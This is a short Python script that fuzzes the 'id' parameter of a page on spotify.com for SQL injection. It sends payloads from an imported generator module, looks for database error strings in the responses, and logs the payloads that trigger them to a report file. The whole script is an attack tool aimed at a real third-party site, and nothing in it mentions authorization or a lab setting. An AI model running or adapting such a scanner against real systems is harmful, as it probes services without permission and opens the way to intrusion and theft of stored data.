import requests
from utils.payload_generator import sql_payloads

URL = "https://www.spotify.com/vulnerablepage"

def fuzz():
    print("[*] Starting SQLi fuzz on 'id' parameter...")
    for payload in sql_payloads:
        params = {"id": payload}
        r = requests.get(URL, params=params)
        if "sql syntax" in r.text.lower() or "you have an error" in r.text.lower():
            print(f"[+] Potential SQL Injection with payload: {payload}")
            with open("reports/sql_sqli_hits.txt", "a") as f:
                f.write(f"{payload}\n")

if __name__ == "__main__":
    fuzz()
